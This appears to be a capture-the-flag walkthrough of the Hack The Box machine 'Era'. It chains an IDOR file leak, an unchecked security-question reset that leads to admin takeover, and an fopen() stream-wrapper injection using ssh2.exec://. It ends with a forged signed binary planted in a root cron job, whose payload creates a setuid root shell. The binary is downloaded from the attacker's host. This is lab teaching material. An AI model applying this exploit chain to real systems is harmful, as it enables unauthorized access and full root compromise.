```bash
curl -s -H 'Cookie: PHPSESSID=<paste your PHPSESSID here>' 'http://file.era.htb/download.php?id=999999&dl=true' | wc -c
```

```bash
seq 1 5000 > ids.txt
ffuf -u 'http://file.era.htb/download.php?id=FUZZ&dl=true' \
     -H 'Cookie: PHPSESSID=<paste your PHPSESSID here>' \
```

Two IDs turn up that aren't mine:

- `150` → a small zip with `key.pem` and `x509.genkey`

A private key and cert config sitting behind an IDOR is exactly the kind of thing that matters later. Keeping it.

# Reading the Source

The backup has the full PHP app. `reset.php` handles "Update Security Questions":

```php
$username = trim($_POST['username'] ?? '');
...
$query = "UPDATE users SET security_answer1 = ?, security_answer2 = ?, security_answer3 = ? WHERE user_name = ?";
$stmt = $db->prepare($query);
$stmt->bindValue(1, $new_answer1, SQLITE3_TEXT);
$stmt->bindValue(2, $new_answer2, SQLITE3_TEXT);
$stmt->bindValue(3, $new_answer3, SQLITE3_TEXT);
$stmt->bindValue(4, $username, SQLITE3_TEXT);
```

The query is parameterized — not SQLi.

But `$username` is:

- Pulled raw from POST
- Never checked against the logged-in session

**This is critical.**

Anyone can overwrite anyone's security answers, just by naming them in the form.

`yuri`'s password also works on FTP from the initial scan:


Two directories: `apache2_conf`, `php8.1_conf`.

Apache configs — nothing interesting.

- `ssh2.so` registers PHP stream wrappers like `ssh2.exec://`
- Lets PHP open an SSH connection and run a command as if reading a file
- No use for it yet, but worth remembering — stream-wrapper abuse only matters when something also calls `fopen()` on user input

# Turning the IDOR into Admin

Reset `admin_ef01cab31aa`'s security answers using the bug above. Log in as admin via "Log in Using Security Questions."

Now admin — worth re-reading `download.php` with that session in mind. There's a branch gated behind it:

```php
} elseif ($_GET['show'] === "true" && $_SESSION['erauser'] === 1) {
    $format = isset($_GET['format']) ? $_GET['format'] : '';
    $file = $fetched[0];

    if (strpos($format, '://') !== false) {
        $wrapper = $format;
    }
    ...
    $file_content = fopen($wrapper ? $wrapper . $file : $file, 'r');
```

- Admin-only "preview" feature
- `format` is checked for `://` and used directly in `fopen()`
- Database file path is appended after it

That's the exact shape `ssh2.so` was hinting at.

`ssh2.exec://user:pass@host:port/command` runs a command over SSH.

- Already have two working credential sets
- SSH doesn't need to be exposed externally — PHP connects to `127.0.0.1` itself

# Privilege Escalation

```bash
eric@era:~$ id
uid=1000(eric) gid=1000(eric) groups=1000(eric),1001(devs)
```

`devs` isn't a default group. `sudo -l` is empty for both users, so this is the only lead.

```bash
find / -group devs 2>/dev/null
```

```
/opt/AV
/opt/AV/periodic-checks
/opt/AV/periodic-checks/monitor
/opt/AV/periodic-checks/status.log
```

`monitor` is a root-owned ELF, group-writable by `devs`, mtime updating every minute → cron.

```bash
./pspy64
```

```
CMD: UID=0 PID=xxxx | bash -c /root/initiate_monitoring.sh
CMD: UID=0 PID=xxxx | objcopy --dump-section .text_sig=text_sig_section.bin /opt/AV/periodic-checks/monitor
CMD: UID=0 PID=xxxx | grep -oP (?<=UTF8STRING        :)Era Inc.
```

So once a minute, root:

- Runs `initiate_monitoring.sh`
- Pulls a custom `.text_sig` ELF section out of `monitor` with `objcopy`
- Greps org name / email out of it — looks like an embedded certificate

Not a standard ELF section. Someone built a custom "signed binary" check, presumably to stop exactly this kind of tampering.

Confirming the check is real — dropping in a plain replacement with no `.text_sig` gets rejected:

```
objcopy: /opt/AV/periodic-checks/monitor: file format not recognized
[ERROR] Executable not signed. Tampering attempt detected. Skipping.
```

**The question:** does it validate the signature *for this exact file*, or just that *a* valid signature exists somewhere in the binary?

Custom, home-rolled scheme → betting on the weaker version.

# Building a Signed Binary

This is where `key.pem` / `x509.genkey` from the earlier IDOR finally matter — the private key and cert template for whatever produces `.text_sig`.

Minimal payload:

```c
#include <unistd.h>
#include <stdlib.h>

int main(void) {
    setuid(0); setgid(0); seteuid(0); setegid(0);
    system("cp /bin/bash /tmp/rootbash && chmod 6777 /tmp/rootbash");
}
```

```bash
gcc exploit.c -o exploit
```

Generate a cert from the recovered key, sign the payload as CMS/PKCS#7, embed it as `.text_sig`:

```bash
openssl req -new -x509 -key key.pem -out cert.pem -days 365 -config x509.genkey

openssl cms -sign -in exploit -signer cert.pem -inkey key.pem \
  -outform DER -out text_sig.der -nodetach -nosmimecap -nocerts -noattr

objcopy --add-section .text_sig=text_sig.der --set-section-flags .text_sig=readonly exploit
```

Upload, overwrite `monitor`:

```bash
wget http://10.10.16.24/exploit -O monitor
chmod +x monitor
cp monitor /opt/AV/periodic-checks/monitor
```

Cron fires within a minute, signature passes, root executes it:

```bash
ls -l /tmp/rootbash
-rwsrwsrwx 1 root root .... /tmp/rootbash
```

```bash
/tmp/rootbash -p
```

Root shell. `root.txt` readable from `/root`.
